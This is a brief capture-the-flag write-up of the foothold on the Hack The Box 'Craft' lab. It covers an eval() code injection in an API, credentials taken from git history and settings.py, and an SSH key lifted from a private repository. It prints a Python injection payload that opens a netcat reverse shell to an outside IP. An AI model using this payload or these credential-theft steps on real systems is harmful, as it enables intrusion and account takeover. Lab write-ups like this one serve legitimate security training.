## FootHold

- On the https webserver, there was two link given to check for which are `api.craft.htb` and `gogs.craft.htb`.
- On the `api.craft.htb`, a craft api was hosted which was dealing with some endpoints.
- On the `gogs.craft.htb`, gogs was hosted which is a self hosted git service.
- The source code of `api.craft.htb` was on gogs. We need a token to send request to api endpoints.
- Found a json web token but it was false.
- Extracted credentials from the commit history.

- Noticed that eval("%s ") is being used in the code which is really really dangerous ðŸ—¡.

- Got rce, but can't get reverse shell. Tried wget, bash reverse shell. Looks like we can't pass pipe (|) over there in the param.
- Payload Worked: `__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.16 9009 >/tmp/f')#`
- Extracted credential from settings.py and also modified `dbtest.py` to extract user's credential from database. Tried ssh but failed. ðŸ™…
- Login to the gogs.craft.htb and noticed a private repo for gilfoyle in which private id_rsa key is saved.
- Logged in via ssh to gilfoyle ðŸŽŠ
